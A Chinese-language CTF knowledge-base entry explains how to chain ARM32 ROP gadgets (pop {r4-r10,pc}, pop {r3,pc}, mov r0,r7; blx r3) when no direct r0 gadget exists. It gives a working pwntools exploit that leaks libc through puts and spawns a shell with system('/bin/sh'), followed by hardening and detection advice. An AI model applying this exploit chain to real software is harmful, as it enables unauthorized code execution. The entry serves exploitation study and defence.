---
id: binary-pwn-rop-arm32-composed-gadget-r0-from-r7-blx-r3
title: ARM32 无直控 r0 gadget 时的两段式组合：pop {r4-r10,pc} 设 r7、pop {r3,pc} 设 r3，再由 mov r0,r7; blx r3 完成 call func(arg1) 并继续 ROP
type: scenario
domain: binary
path: binary/pwn/rop
technique: arm32-composed-gadget-mov-r0-r7-blx-r3
tags:
- pwn
- arm
- arm32
- rop
- gadget
- ret2libc
- qemu
- ctf
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W9
  verified_at: '2026-11-09T03:34:42+08:00'
  notes: 已对照原文核对；本次核对未读取图片；pop {r4-r10,pc} 设 r7、pop {r3,pc} 设 r3、mov r0,r7; blx r3 组合调用、尾部 POP {R4-R10,PC} 继续链、BNE 不跳的前提与地址 0x10CB0/0x10464/0x10CA0 均与正文一致。未验证点：未运行 EXP，具体 gadget 反汇编依据未读截图
url: /docs/binary/pwn/rop/binary-pwn-rop-arm32-composed-gadget-r0-from-r7-blx-r3/
draft: false
kb_aliases:
- SimpleDecoder
- ARM 组合 gadget
- mov r0 r7 blx r3
- pop {r4-r10, pc}
- pop {r3, pc}
- ARM ret2libc 无 pop r0
---

## 一句话结论

当 ARM32 程序里找不到 `pop {r0, ..., pc}` 而只有一个 `pop {r4-r10, pc}` 时，可以把「设参」和「定目标」拆成两步：先用 `pop {r4-r10, pc}` 把 `r7` 填成参数值，再用 `pop {r3, pc}` 把 `r3` 填成函数地址，最后跳到 `mov r0, r7; blx r3` 那段既搬参数又间接调用的 gadget——因为该段末尾还会走到 `POP {R4-R10, PC}`，所以调用返回后 ROP 链能继续，等价于 `call func(arg1)`。

## 原理

- ARM32 用 `r0`–`r3` 传参，没有能直接写 `r0` 的 gadget 时并非无解：只要存在「把某个可控寄存器搬到 `r0`」+「间接调用某个可控寄存器」的组合，就能合成「带参调用」原语。
- `blx r3` 的语义是「跳到 `r3` 并把返回地址写入 `LR`」，因此它本质是一次函数调用而非尾跳转；被调函数返回时会回到 `blx` 之后的下一条指令，这使链可以继续（区别于 `bx r3` 的尾跳）。
- 之所以要跳进这段 gadget 的中间而不是函数开头：目标是只借「`addi/mov` 搬参 + `blx`」这几条指令，进入点要选在寄存器已被前两级 gadget 填好之后。
- 链能一直控下去的前提是后续条件分支不成立（例题中 `BNE loc_10C90` 未跳），于是执行流最终落到该段的 `POP {R4-R10, PC}`，把栈上后续值继续弹进 `pc`——也就是说这段 gadget 自带「返回后继续链」的出口。
- 由此得到一般套路：`pop 大批寄存器`（提供任意寄存器值）+ `pop 小批寄存器`（提供调用目标）+ `mov rA, rB; blx rC`（合成调用），三块拼出 ARM 上没有直接 `pop {r0, pc}` 时的通用供参能力。

## 触发条件

- ARM32 程序（例题为 `arm-32-little` 动态链接）存在栈溢出且偏移可控，能连续摆放多级 gadget。
- 程序中无 `pop {r0, ...}` 类 gadget，但存在 `pop {r4-r10, pc}`、`pop {r3, pc}` 与 `mov r0, r7; blx r3`（或类似 `mov r0, <可控reg>; blx <可控reg>`）的组合。
- 该 `blx` 段落尾部存在可继续取 `pc` 的弹栈序列（如 `POP {R4-R10, PC}`），且中间条件分支在构造下不会跳转。
- 已有 libc（例题为 2.27），可先通过 `puts` 泄 GOT 得基址，再取 `system`/`/bin/sh`。

## 利用步骤

1. 反汇编定位所有 `pop` 与 `mov ... blx ...` 片段，确认 `pop {r4-r10,pc}` 中 `r7` 的位置（第 4 个寄存器）与 `pop {r3,pc}`。
2. 先用第一段链泄 libc：`填充 + pop_r3_pc + puts_plt + pop_7_ret + puts_got*7 + mov_r0_r7_blx_r3`，注意把 `r7` 槽位填 `puts_got`（作为 `r0`），并把返回继续位填回 `main` 以便二次利用。
3. 收 `puts` 输出算 `libc_base = leak - libc.sym['puts']`，得到 `system`、`/bin/sh`、`pop {r0, pc}`（若 libc 内有可用 gadget）。
4. 第二轮：按同样结构用 `mov r0, r7; blx r3` 调 `system`，`r7` 槽填 `/bin/sh`，`r3` 槽填 `system`。
5. `qemu-arm -L <cross-libc 目录> ./chall` 跑，必要时 `-g 1234` 配 `gdb-multiarch` 在 `blx` 前核对 `r0` 与 `r3`。

## PoC

```python
from pwn import *
context(arch='arm', os='linux', log_level='debug')
p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabihf/', './chall'])
libc = ELF("./libc-2.27.so"); elf = ELF("./chall")

# 第一轮：泄 puts
pop_7_ret   = 0x00010CB0   # pop {r4-r10, pc}
pop_r3_ret  = 0x00010464   # pop {r3, pc}
mov_r0_r7   = 0x00010CA0   # mov r0, r7; blx r3（尾部仍会 POP {R4-R10,PC}）

payload  = b'a'*0x2c
payload += p32(pop_r3_ret) + p32(elf.plt['puts'])        # r3 = puts
payload += p32(pop_7_ret)  + p32(elf.got['puts'])*7      # r7 = puts@got
payload += p32(mov_r0_r7)                                # call puts(puts@got)
payload += p32(0x00010C30)*10                            # 返回 main 继续
p.sendlineafter('comment> ', payload)
libc_base = u32(p.recv(4)) - libc.sym['puts']

# 第二轮：call system("/bin/sh")
payload  = b'a'*0x2c
payload += p32(pop_r3_ret) + p32(libc_base + libc.sym['system'])
payload += p32(pop_7_ret)  + p32(libc_base + next(libc.search(b'/bin/sh\x00')))*7
payload += p32(mov_r0_r7)
p.sendlineafter('comment> ', payload)
p.interactive()
```

判定：`blx r3` 执行瞬间 `r3` 为 `system`、`r0` 指向 `/bin/sh`，且 `blx` 返回后栈上剩余值仍被 `POP {R4-R10, PC}` 消费（链未中断）。

## 变体与关联

- 变体：`mov r0, r7` 可换成 `mov r0, r4/r5/...`，只要该寄存器能由 `pop {r4-r10, pc}` 控制；`blx r3` 可换成 `blx r12` 等。
- 变体：若段尾没有可继续的弹栈，可改成「调一次就重进 main」的单次利用模式。
- 关联：[[binary-pwn-rop-arm32-stripped-ret2libc-pop-r0-static]]（有 `pop {r0, r4, pc}` 的直控版本）。
- 关联：[[binary-pwn-rop-mips32-stack-frame-gadget-args]]（MIPS 上用 `$t9` + 保存寄存器供参的同类「组合调用」思路）。

## 检测与防御

- 加固：PIE/ASLR + 栈保护；控制流完整性（ARMv8.5 BTI/PAC）会显著抬高此类 `blx <寄存器>` 间接调用劫持的门槛。
- 加固：减少「先取寄存器值再间接调用」的代码形态，或在间接调用前校验目标地址范围。
- 检测（分析侧）：`mov rX, rY; blx rZ` + 尾部弹栈序列是 ARM 组合 gadget 的典型签名；在 `blx` 处下断并检查目标落在库函数而非预期符号。
- 检测（运行时）：`blx` 目标落点为 libc 函数且相邻栈帧为溢出数据，属异常调用。
